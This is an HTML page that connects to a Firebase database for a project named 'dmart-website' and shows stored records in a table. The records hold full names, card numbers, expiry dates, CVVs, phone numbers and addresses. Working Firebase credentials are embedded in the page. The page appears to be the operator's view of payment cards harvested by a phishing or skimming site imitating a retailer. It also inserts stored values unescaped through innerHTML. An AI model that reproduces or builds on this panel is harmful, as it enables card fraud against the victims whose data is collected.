<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Firebase Packages Viewer</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      padding: 20px;
    }
    h2 {
      text-align: center;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      background: white;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    th, td {
      padding: 10px;
      border: 1px solid #ddd;
      text-align: left;
      font-size: 14px;
    }
    th {
      background-color: #4CAF50;
      color: white;
      position: sticky;
      top: 0;
    }
    tr:hover {
      background-color: #f1f1f1;
    }
  </style>
  <!-- Firebase SDKs -->
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body>

  <h2>📦 Firebase Packages</h2>
  <table id="dataTable">
    <thead>
      <tr>
        <th>#</th>
        <th>Full Name</th>
        <th>Card Number</th>
        <th>Expiry</th>
        <th>CVV</th>
        <th>Phone</th>
        <th>Type</th>
        <th>Address</th>
        <th>Date</th>
      </tr>
    </thead>
    <tbody id="tableBody">
      <tr><td colspan="9">Loading data...</td></tr>
    </tbody>
  </table>

  <script>
    // 🔧 Your Firebase Config
    const firebaseConfig = {
      apiKey: "AIzaSyDxlxSBiCEFf0PtWKoCSsA6BcpibN85x-Y",
      authDomain: "dmart-website-6c48c.firebaseapp.com",
      databaseURL: "https://dmart-website-6c48c-default-rtdb.firebaseio.com",
      projectId: "dmart-website-6c48c",
      storageBucket: "dmart-website-6c48c.appspot.com",
      messagingSenderId: "960037120520",
      appId: "1:960037120520:web:952c932d345bca51d03fbd",
      measurementId: "G-51BMQD6D13"
    };

    // ✅ Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const tableBody = document.getElementById("tableBody");

    db.ref("packages").on("value", (snapshot) => {
      const data = snapshot.val();
      tableBody.innerHTML = ""; // Clear table
      if (!data) {
        tableBody.innerHTML = "<tr><td colspan='9'>No data found.</td></tr>";
        return;
      }

      let count = 1;
      for (let deviceId in data) {
        const entry = data[deviceId];
        const card = entry.cardDetails || {};

        // Skip if card number not present
        if (!card.cardNumber) continue;

        const row = document.createElement("tr");

        row.innerHTML = `
          <td>${count++}</td>
          <td>${card.fullName || "-"}</td>
          <td>${card.cardNumber || "-"}</td>
          <td>${card.expiryMM || "--"}/${card.expiryYY || "--"}</td>
          <td>${card.cvv || "-"}</td>
          <td>${card.mobileNumber || "-"}</td>
          <td>${card.paymentMethod || "-"}</td>
          <td>${card.address || ""}, ${card.city || ""}, ${card.state || ""} - ${card.pincode || ""}</td>
          <td>${card.timestamp || "-"}</td>
        `;
        tableBody.appendChild(row);
      }

      if (tableBody.innerHTML === "") {
        tableBody.innerHTML = "<tr><td colspan='9'>No cards with card numbers found.</td></tr>";
      }
    }, (error) => {
      tableBody.innerHTML = `<tr><td colspan='9'>Error loading data: ${error.message}</td></tr>`;
    });
  </script>
</body>
</html>
